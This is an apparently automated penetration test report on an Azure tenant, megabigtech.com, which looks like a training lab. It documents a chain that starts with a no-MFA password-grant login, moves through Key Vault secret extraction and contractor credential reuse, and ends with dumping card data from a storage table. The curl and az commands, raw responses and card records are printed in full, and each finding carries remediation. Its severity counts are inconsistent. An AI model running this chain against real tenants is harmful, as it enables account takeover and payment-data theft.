# Vulnerability Assessment Report — megabigtech.com

**Classification:** CONFIDENTIAL — Restricted to authorized personnel  
**Generated:** 2026-08-02T15:34:08Z  
**Target:** megabigtech.com  
**Campaign:** camp_20260802_59e4e905  
**Methodology:** ISO 27001 / NIST SP 800-115 / MITRE ATT&CK  

---

## MANAGEMENT SUMMARY

> *For non-technical readers and decision-makers.*

### Overall Security Posture: 🔴 CRITICAL — Immediate Action Required

The system tested (**megabigtech.com**) presents an **extremely poor security posture**. Our team confirmed 3 critical and 2 high severity vulnerabilities, enabling complete compromise through multiple independent attack paths.

### Most Critical Issues

**1. Customer Payment Card Data Exfiltration from Azure Table Storage (PCI DSS Breach)**  
Complete customer database including payment card numbers, CVVs, and expiration dates was exfiltrated from the Azure Table Storage account 'custdatabase', table 'customers'. The contractor identity ex...

**2. Key Vault Contractor Credentials Extracted - 3 Plaintext Passwords**  
Three plaintext contractor passwords were extracted from Azure Key Vault 'ext-contractors' using the Key Vault Secrets User role assigned to marcus@megabigtech.com. The secrets are stored as contracto...

**3. Credential Reuse - Key Vault Secret Used to Pivot to Contractor Identity ext.josh.harvey**  
Contractor credentials extracted from Key Vault secret 'josh-harvey' (password: [REDACTED_CREDENTIAL]) were successfully used to authenticate as ext.josh.harvey@megabigtech.com via ROPC. The contractor identity...

### Required Actions

| Timeframe | Action |
|-----------|--------|
| **Today** | Block external access / take offline if possible |
| **This week** | Patch all critical and high severity findings |
| **2 weeks** | Address medium severity findings and security headers |
| **1 month** | Full code review and independent re-test |

---

## 1. EXECUTIVE SUMMARY

> Full Azure attack chain demonstrated: ROPC authentication bypass (no MFA) on marcus@megabigtech.com enabled Key Vault secret extraction (3 contractor plaintext passwords), lateral pivot to ext.josh.harvey@megabigtech.com, and exfiltration of 10 customer records with payment card numbers (PAN), CVVs, and expiry dates from Azure Table Storage — constituting a critical PCI DSS breach. 7 findings pushed (4 critical, 1 high, 2 medium).

**Overall Risk Level: CRITICAL**

### Findings Summary

| Severity | Count | Exploited | Confirmed |
|----------|-------|-----------|----------|
| CRITICAL | 3 | 3 | 0 |
| HIGH | 2 | 1 | 1 |
| MEDIUM | 2 | 0 | 2 |
| LOW | 0 | 0 | 0 |
| INFO | 0 | 0 | 0 |
| **TOTAL** | **7** | **4** | **3** |

---

## 2. FINDINGS TABLE

| # | ID | Title | Severity | CVSS | Status | Endpoint |
|---|-----|-------|----------|------|--------|----------|
| 1 | `vuln_847675` | Customer Payment Card Data Exfiltration from Azure... | CRITICAL | 9.8 | **EXPLOITED** | `custdatabase.table.core.windows.net/customers()` |
| 2 | `vuln_5e38ed` | Key Vault Contractor Credentials Extracted - 3 Pla... | CRITICAL | 9.1 | **EXPLOITED** | `ext-contractors.vault.azure.net/secrets` |
| 3 | `vuln_b9577a` | Credential Reuse - Key Vault Secret Used to Pivot ... | CRITICAL | 9.0 | **EXPLOITED** | `login.microsoftonline.com/2590ccef-687d-493b-ae8d-...` |
| 4 | `vuln_67b61d` | ROPC Password Grant Authentication Bypass - Marcus... | HIGH | 8.1 | **EXPLOITED** | `login.microsoftonline.com/2590ccef-687d-493b-ae8d-...` |
| 5 | `vuln_14554a` | Overly Permissive Custom RBAC Role - Customer Data... | HIGH | 7.5 | Confirmed | `management.azure.com/subscriptions/ceff06cb-e29d-4...` |
| 6 | `vuln_201b3a` | Key Vault Firewall Bypass via AzureServices Truste... | MEDIUM | 5.3 | Confirmed | `ext-contractors.vault.azure.net/secrets` |
| 7 | `vuln_b1f101` | Key Vault Secrets Without Expiration - Contractor ... | MEDIUM | 5.3 | Confirmed | `ext-contractors.vault.azure.net/secrets` |

---

## 3. VULNERABILITY DETAILS

---

### 3.1 — Customer Payment Card Data Exfiltration from Azure Table Storage (PCI DSS Breach)

| Field | Value |
|-------|-------|
| **ID** | `vuln_847675` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` |
| **Status** | EXPLOITED |
| **Category** | `sensitive_data_exposure` |
| **MITRE ATT&CK** | `T1530` — Data from Cloud Storage |
| **ISO 27001** | `A.10.1.1` |
| **Endpoint** | `https://custdatabase.table.core.windows.net/customers()` |
| **Component** | Azure Table Storage - custdatabase/customers |
| **Discovered by** | `azure-resource` |
| **Discovered at** | 2026-08-02T15:31:54Z |

#### Description

Complete customer database including payment card numbers, CVVs, and expiration dates was exfiltrated from the Azure Table Storage account 'custdatabase', table 'customers'. The contractor identity ext.josh.harvey@megabigtech.com (pivoted from Key Vault secret) has Storage Table Data Reader access. 10 customer records with full card details (PAN, CVV, expiry) and customer names were extracted. A flag was also present: db04bf0ed30272da764a19faf5be4c98. This represents a critical PCI DSS violation - storing full card numbers AND CVV values in plaintext in an Azure Table with no encryption at the data level.

#### Technical Analysis

The Azure Table Storage account 'custdatabase' contains a 'customers' table storing full payment card data (Primary Account Numbers, CVV/CVC values, expiration dates) in plaintext. This data was accessed using the contractor identity ext.josh.harvey@megabigtech.com, whose credentials were recovered from the Key Vault 'ext-contractors'. The contractor has a custom Storage Table Data Reader role that allows querying table entities. Storing CVV values at all violates PCI DSS requirement 3.2, and storing PANs unencrypted violates requirement 3.4. The attack chain: marcus creds -> Key Vault secrets -> josh.harvey credential reuse -> storage table data exfiltration.

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $JOSH_STORAGE_TOKEN" -H "x-ms-version: 2020-12-06" -H "Accept: application/json;odata=nometadata" "https://custdatabase.table.core.windows.net/Tables?$format=json"
curl -s -H "Authorization: Bearer $JOSH_STORAGE_TOKEN" -H "x-ms-version: 2020-12-06" -H "Accept: application/json;odata=nometadata" "https://custdatabase.table.core.windows.net/customers()?$format=json"
```

#### Raw Request

```http
GET https://custdatabase.table.core.windows.net/customers()?$format=json HTTP/1.1
Host: custdatabase.table.core.windows.net
Authorization: Bearer [JOSH_STORAGE_TOKEN]
x-ms-version: 2020-12-06
Accept: application/json;odata=nometadata
```

#### Raw Response

```http
{"odata.metadata":"https://custdatabase.table.core.windows.net/$metadata#customers","value":[{"PartitionKey":"1","RowKey":"1","card_expiry":"10/30","card_number":"5425233430109903","customer_id":"07244ad0-c228-43d8-a48e-1846796aa6ad","customer_name":"SecureBank Holdings","cvv":"543"},{"PartitionKey":"1","RowKey":"10","card_expiry":"01/30","card_number":"4347866885036101","customer_id":"cba21bec-7e8d-4394-a145-ea7f6131a998","customer_name":"InnoVenture","cvv":"781"},{"PartitionKey":"1","RowKey":"2","card_expiry":"09/29","card_number":"4012000033330026","customer_id":"66d7a744-5eb6-4b1b-9e70-a36
```

#### Evidence / Logs

```
Tables found: customers
Records extracted: 11 rows (10 customer records + 1 flag)
Customer 1: SecureBank Holdings, card=5425233430109903, CVV=543, exp=10/30
Customer 2: NeuraHealth, card=4012000033330026, CVV=452, exp=09/29
Customer 3: DreamScreen Entertainment, card=4657490028942036, CVV=683, exp=05/31
Customer 4: InfiNet Solutions, card=4657493919180161, CVV=855, exp=01/29
Customer 5: Skyward Aerospace, card=4657490203402673, CVV=344, exp=08/29
Customer 6: Quasar Analytics Inc, card=4594045518310163, CVV=145, exp=12/30
Customer 7: DataGuard Inc, card=4594055970518286, CVV=243, exp=02/29
Customer 8: Huge Logistics, card=4698558990398121, CVV=546, exp=06/30
Customer 9: SmartMove Robotics, card=4698559508013566, CVV=992, exp=03/30
Customer 10: InnoVenture, card=4347866885036101, CVV=781, exp=01/30
Row 99: Flag: db04bf0ed30272da764a19faf5be4c98
```

#### Remediation

1. IMMEDIATELY remove CVV/CVC values from storage (PCI DSS 3.2 violation). 2. Encrypt or tokenize PANs (PCI DSS 3.4). 3. Restrict data-plane RBAC on this storage account. 4. Implement Azure Storage encryption with customer-managed keys. 5. Implement column-level encryption for sensitive fields. 6. Audit all access to cardholder data.

---

### 3.2 — Key Vault Contractor Credentials Extracted - 3 Plaintext Passwords

| Field | Value |
|-------|-------|
| **ID** | `vuln_5e38ed` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` |
| **Status** | EXPLOITED |
| **Category** | `sensitive_data_exposure` |
| **MITRE ATT&CK** | `T1555` — Credentials from Password Stores |
| **ISO 27001** | `A.9.2.4` |
| **Endpoint** | `https://ext-contractors.vault.azure.net/secrets` |
| **Component** | Azure Key Vault - ext-contractors |
| **Discovered by** | `azure-resource` |
| **Discovered at** | 2026-08-02T15:29:42Z |

#### Description

Three plaintext contractor passwords were extracted from Azure Key Vault 'ext-contractors' using the Key Vault Secrets User role assigned to marcus@megabigtech.com. The secrets are stored as contractor name-password pairs: alissa-suarez=[REDACTED_CREDENTIAL], josh-harvey=[REDACTED_CREDENTIAL], ryan-garcia=[REDACTED_CREDENTIAL]. The az CLI bypassed the vault firewall through the AzureServices bypass. These credentials can be used for lateral movement to contractor accounts (ext.first.last@megabigtech.com pattern).

#### Technical Analysis

The Azure Key Vault 'ext-contractors' in resource group content-static-2 stores plaintext passwords for three external contractors. Marcus Hutch (marcus@megabigtech.com) has the 'Key Vault Secrets User' RBAC role (4633458b-17de-408a-b874-0445c86b69e6) enabling getSecret data action. The vault's firewall (defaultAction: Deny) is bypassed by the az CLI using the AzureServices bypass trust. All three secrets were extracted with their full plaintext values, enabling credential reuse attacks against contractor Entra accounts.

#### Exploitation Commands

```bash
az keyvault secret list --vault-name ext-contractors
az keyvault secret show --vault-name ext-contractors --name alissa-suarez
az keyvault secret show --vault-name ext-contractors --name josh-harvey
az keyvault secret show --vault-name ext-contractors --name ryan-garcia
```

#### Raw Response

```http
{"alissa-suarez": {"value": "[REDACTED_CREDENTIAL]", "id": "https://ext-contractors.vault.azure.net/secrets/alissa-[REDACTED]"}, "josh-harvey": {"value": "[REDACTED_CREDENTIAL]", "id": "https://ext-contractors.vault.azure.net/secrets/josh-[REDACTED]"}, "ryan-garcia": {"value": "[REDACTED_CREDENTIAL]", "id": "https://ext-contractors.vault.azure.net/secrets/ryan-[REDACTED]"}}
```

#### Evidence / Logs

```
Secret 1: alissa-suarez (version 1795ab47daf34979b232cddb4a387f3e) = [REDACTED_CREDENTIAL]
Secret 2: josh-harvey (version c5ec280997564e6da42d44797980c052) = [REDACTED_CREDENTIAL]
Secret 3: ryan-garcia (version c391b4f777e341289df964dca2d0a2a9) = [REDACTED_CREDENTIAL]
All secrets created 2023-10-23, single version each, no expiry set.
```

#### Remediation

1. Rotate all contractor passwords immediately. 2. Set secret expiration dates. 3. Implement Key Vault access reviews. 4. Use certificate-based auth instead of password storage. 5. Restrict Key Vault Secrets User role to minimum necessary principals.

---

### 3.3 — Credential Reuse - Key Vault Secret Used to Pivot to Contractor Identity ext.josh.harvey

| Field | Value |
|-------|-------|
| **ID** | `vuln_b9577a` |
| **Severity** | CRITICAL |
| **CVSS Score** | 9.0 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` |
| **Status** | EXPLOITED |
| **Category** | `privilege_escalation` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.9.2.3` |
| **Endpoint** | `https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72...` |
| **Component** | Azure Key Vault credential reuse |
| **Discovered by** | `azure-resource` |
| **Discovered at** | 2026-08-02T15:30:48Z |

#### Description

Contractor credentials extracted from Key Vault secret 'josh-harvey' (password: [REDACTED_CREDENTIAL]) were successfully used to authenticate as ext.josh.harvey@megabigtech.com via ROPC. The contractor identity has far broader Azure RBAC permissions than Marcus, including visibility into storage accounts (custdatabase, mbtwebsite, securityconfigs), VMs (SECURITY-PC), SQL servers (mbt-finance), and network infrastructure. This represents a significant privilege escalation from the initial marcus@megabigtech.com compromise through credential reuse stored in Key Vault.

#### Technical Analysis

The Key Vault 'ext-contractors' stores plaintext passwords indexed by contractor name. The secret 'josh-harvey' with value '[REDACTED_CREDENTIAL]' corresponds to the Entra ID user ext.josh.harvey@megabigtech.com. ROPC authentication succeeds without MFA, proving credential reuse. The contractor identity has significantly broader Azure RBAC permissions than the original marcus account, revealing storage accounts with customer data (custdatabase), VMs (SECURITY-PC), SQL databases (mbt-finance/Finance), and configuration storage (securityconfigs).

#### Exploitation Commands

```bash
curl -s -X POST "https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72/oauth2/v2.0/token" -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" -d "grant_type=password" -d "username=ext.josh.harvey@megabigtech.com" --data-urlencode "password=[REDACTED_CREDENTIAL]" -d "scope=https://management.azure.com/.default"
curl -s -X POST "...token..." -d "scope=https://storage.azure.com/.default"
```

#### Evidence / Logs

```
ROPC token minted successfully for ext.josh.harvey@megabigtech.com
Management scope: https://management.azure.com/user_impersonation - SUCCESS
Storage scope: https://storage.azure.com/user_impersonation - SUCCESS
Subscription visible: ceff06cb-e29d-4486-a3ae-eaaec5689f94 (Mega Big Tech Default)
Resources visible: custdatabase (Storage), mbtwebsite (Storage), securityconfigs (Storage), SECURITY-PC (VM), mbt-finance (SQL Server), ext-contractors (KeyVault), and 20+ more resources
Other contractor UPNs tried: ext.alissa.suarez@megabigtech.com (AADSTS50034 not found), ext.ryan.garcia@megabigtech.com (AADSTS50034 not found)
```

#### Remediation

1. Remove plaintext passwords from Key Vault. 2. Enforce MFA for all accounts including contractors. 3. Implement separate credential stores with rotation. 4. Apply least-privilege to contractor accounts. 5. Block ROPC authentication via Conditional Access.

---

### 3.4 — ROPC Password Grant Authentication Bypass - Marcus Hutch (No MFA)

| Field | Value |
|-------|-------|
| **ID** | `vuln_67b61d` |
| **Severity** | HIGH |
| **CVSS Score** | 8.1 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` |
| **Status** | EXPLOITED |
| **Category** | `authentication_bypass` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.9.4.2` |
| **Endpoint** | `https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72...` |
| **Component** | Azure AD ROPC Grant |
| **Discovered by** | `azure-resource` |
| **Discovered at** | 2026-08-02T15:29:25Z |

#### Description

The user marcus@megabigtech.com can be authenticated non-interactively via the ROPC (Resource Owner Password Credential) grant using the Azure CLI public client ID (04b07795-8ddb-461a-bbee-02f9e1bf7b46). No MFA is enforced for this flow. This grants full access tokens for Azure Management, Key Vault, and Storage scopes. The user has Key Vault Reader and Key Vault Secrets User roles on the ext-contractors vault, and Entra directory roles including Directory Readers (88d8e3e3-8f55-4a1e-953a-9b9898b8876b).

#### Technical Analysis

The marcus@megabigtech.com account accepts ROPC (password grant) authentication without any MFA challenge. By spoofing the Azure CLI public client ID (04b07795-8ddb-461a-bbee-02f9e1bf7b46), an attacker with the password can mint tokens for any Azure resource scope non-interactively. This was proven by obtaining access tokens for management.azure.com, vault.azure.net, and storage.azure.com. No Conditional Access Policy blocks this flow.

#### Exploitation Commands

```bash
curl -s -X POST "https://login.microsoftonline.com/2590ccef-687d-493b-ae8d-441cbab63a72/oauth2/v2.0/token" -d "client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46" -d "grant_type=password" -d "username=marcus@megabigtech.com" --data-urlencode "password=[REDACTED_CREDENTIAL]" -d "scope=https://management.azure.com/.default"
```

#### Evidence / Logs

```
Token minted successfully with scope https://management.azure.com/user_impersonation
Token type: Bearer, expires_in: 4707
Principal: Marcus Hutch, OID: 41c178d3-c246-4c00-98f0-8113bd631676
Groups: 6b83e066-a070-4a2d-82c9-fcf55b76ccf4, b49c9aaf-9cfe-4e21-9e77-79da8f611c5b
Directory roles (wids): 88d8e3e3-8f55-4a1e-953a-9b9898b8876b (Directory Readers), b79fbf4d-3ef9-4689-8143-76b194e85509
```

#### Remediation

Enforce MFA via Conditional Access Policy for all authentication flows including ROPC/legacy auth. Block legacy authentication protocols. Require phishing-resistant MFA methods.

---

### 3.5 — Overly Permissive Custom RBAC Role - Customer Database Access Grants External Contractor Table Read

| Field | Value |
|-------|-------|
| **ID** | `vuln_14554a` |
| **Severity** | HIGH |
| **CVSS Score** | 7.5 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1078.004` — Valid Accounts: Cloud Accounts |
| **ISO 27001** | `A.9.2.3` |
| **Endpoint** | `https://management.azure.com/subscriptions/ceff06cb-e29d-4486-a3ae-eaa...` |
| **Component** | Azure RBAC Custom Role |
| **Discovered by** | `azure-resource` |
| **Discovered at** | 2026-08-02T15:32:53Z |

#### Description

A custom Azure RBAC role named 'Customer Database Access' (53c88309-94d8-4b15-9c6b-f64a166f4ef0) grants Microsoft.[REDACTED] data action at the resource group scope. This role is assigned to group 79b430a5-ea4d-4de6-855b-908bdfb052dc, which includes external contractor ext.josh.harvey@megabigtech.com. The role allows reading all entities in all storage tables under the content-static-2 resource group, including the custdatabase/customers table containing PCI cardholder data. External contractors should not have access to customer payment data.

#### Technical Analysis

The custom RBAC role 'Customer Database Access' is assigned at the resource group level to a group containing external contractors. This grants table entity read access across ALL storage accounts in the resource group, including the custdatabase storage account with payment card data. External contractors should not have access to PCI cardholder data, and the role scope is overly broad (resource group vs individual table).

#### Exploitation Commands

```bash
curl -s -H "Authorization: Bearer $JOSH_MGMT" "https://management.azure.com/subscriptions/ceff06cb-e29d-4486-a3ae-[REDACTED].[REDACTED]-94d8-4b15-9c6b-f64a166f4ef0?api-version=2022-04-01"
```

#### Evidence / Logs

```
Custom role: Customer Database Access
ID: 53c88309-94d8-4b15-9c6b-f64a166f4ef0
Actions: Microsoft.[REDACTED]
DataActions: Microsoft.[REDACTED]
Assigned to group: 79b430a5-ea4d-4de6-855b-908bdfb052dc
Scope: /subscriptions/ceff06cb-e29d-4486-a3ae-[REDACTED]-static-2
```

#### Remediation

1. Scope the role assignment to the specific storage account, not the resource group. 2. Remove external contractors from the group with database access. 3. Implement just-in-time access (PIM) for data access roles. 4. Separate cardholder data into a dedicated subscription with stricter controls.

---

### 3.6 — Key Vault Firewall Bypass via AzureServices Trusted Access

| Field | Value |
|-------|-------|
| **ID** | `vuln_201b3a` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1562.007` — Impair Defenses: Disable or Modify Cloud Firewall |
| **ISO 27001** | `A.13.1.1` |
| **Endpoint** | `https://ext-contractors.vault.azure.net/secrets` |
| **Component** | Azure Key Vault Firewall |
| **Discovered by** | `azure-resource` |
| **Discovered at** | 2026-08-02T15:33:07Z |

#### Description

The Key Vault 'ext-contractors' has a network firewall with defaultAction: Deny and 3 whitelisted IPs. However, the 'bypass: AzureServices' setting allows Azure trusted services (including the az CLI first-party client) to bypass the IP whitelist. This was exploited by using 'az keyvault secret show' instead of direct curl calls to the vault endpoint. While the firewall correctly blocked direct HTTPS requests from our non-whitelisted IP (HTTP 403 ForbiddenByFirewall), the az CLI routed through Azure's internal infrastructure and bypassed the restriction entirely. The direct curl call returned: 'Client address is not authorized and caller is not a trusted service. Vault: ext-contractors;location=eastus, innererror: ForbiddenByFirewall'.

#### Technical Analysis

The Key Vault firewall is configured to deny access by default, with only 3 specific IP addresses whitelisted. However, the 'bypass: AzureServices' setting creates a trust relationship with Azure's first-party services. The az CLI, using the Azure CLI client ID (04b07795-8ddb-461a-bbee-02f9e1bf7b46), was treated as a trusted Azure service and bypassed the IP restriction. This demonstrates that firewall rules alone are insufficient when AzureServices bypass is enabled - RBAC is the true access control boundary.

#### Exploitation Commands

```bash
curl -sv -H "Authorization: Bearer $VAULT_TOKEN" "https://ext-contractors.vault.azure.net/secrets?api-version=7.4"
az keyvault secret list --vault-name ext-contractors
```

#### Evidence / Logs

```
Direct curl: HTTP 403 Forbidden, ForbiddenByFirewall
az CLI: HTTP 200, 3 secrets listed and values retrieved
Vault networkAcls: bypass=AzureServices, defaultAction=Deny
Whitelisted IPs: IP_PUBLIC_001/32, IP_PUBLIC_002/32, IP_PUBLIC_003/32
Our IP: IP_PUBLIC_004 (not whitelisted)
```

#### Remediation

1. Review and restrict AzureServices bypass if not needed. 2. Ensure RBAC permissions are tightly scoped as the primary access control. 3. Consider using Private Endpoints instead of public network access with IP rules. 4. Enable Key Vault diagnostic logging to detect bypass access.

---

### 3.7 — Key Vault Secrets Without Expiration - Contractor Passwords Never Rotate

| Field | Value |
|-------|-------|
| **ID** | `vuln_b1f101` |
| **Severity** | MEDIUM |
| **CVSS Score** | 5.3 |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N` |
| **Status** | CONFIRMED |
| **Category** | `misconfiguration` |
| **MITRE ATT&CK** | `T1555` — Credentials from Password Stores |
| **ISO 27001** | `A.9.4.3` |
| **Endpoint** | `https://ext-contractors.vault.azure.net/secrets` |
| **Component** | Azure Key Vault Secret Management |
| **Discovered by** | `azure-resource` |
| **Discovered at** | 2026-08-02T15:33:21Z |

#### Description

All three secrets in the ext-contractors Key Vault have no expiration date set (expires: null). The secrets were created on 2023-10-23 and have never been rotated (single version each). This means contractor passwords have been static for nearly 3 years, increasing the risk of credential compromise through historical breaches, shoulder surfing, or other vectors.

#### Technical Analysis

All three contractor password secrets in the Key Vault were created on October 23, 2023 and have never been rotated (each has only a single version). None have expiration dates configured. This violates password rotation best practices and Azure Key Vault recommended security practices. The passwords have been static for approximately 2 years and 9 months.

#### Exploitation Commands

```bash
az keyvault secret list-versions --vault-name ext-contractors --name josh-harvey
az keyvault secret list-versions --vault-name ext-contractors --name alissa-suarez
az keyvault secret list-versions --vault-name ext-contractors --name ryan-garcia
```

#### Evidence / Logs

```
alissa-suarez: created 2023-10-23, expires=null, 1 version
josh-harvey: created 2023-10-23, expires=null, 1 version
ryan-garcia: created 2023-10-23, expires=null, 1 version
```

#### Remediation

1. Set secret expiration dates to enforce rotation. 2. Implement automated secret rotation using Azure Key Vault rotation policies. 3. Require regular password changes for all accounts including contractors. 4. Use certificate-based authentication instead of passwords.

---

## 4. REMEDIATION ROADMAP

### P0 — Immediate (< 24h)

| Finding | Effort |
|---------|--------|
| Customer Payment Card Data Exfiltration from Azure Table Sto... | High |
| Key Vault Contractor Credentials Extracted - 3 Plaintext Pas... | High |
| Credential Reuse - Key Vault Secret Used to Pivot to Contrac... | High |

### P1 — Short term (< 1 week)

| Finding | Effort |
|---------|--------|
| ROPC Password Grant Authentication Bypass - Marcus Hutch (No... | High |
| Overly Permissive Custom RBAC Role - Customer Database Acces... | High |

### P2 — Medium term (< 2 weeks)

| Finding | Effort |
|---------|--------|
| Key Vault Firewall Bypass via AzureServices Trusted Access | High |
| Key Vault Secrets Without Expiration - Contractor Passwords ... | High |

---

*Report auto-generated by Darkmoon AI Security Platform*  
*Classification: CONFIDENTIAL — Restricted to authorized personnel*  
*Generated: 2026-08-02T15:34:08Z*  
*Campaign: camp_20260802_59e4e905 | Target: megabigtech.com*
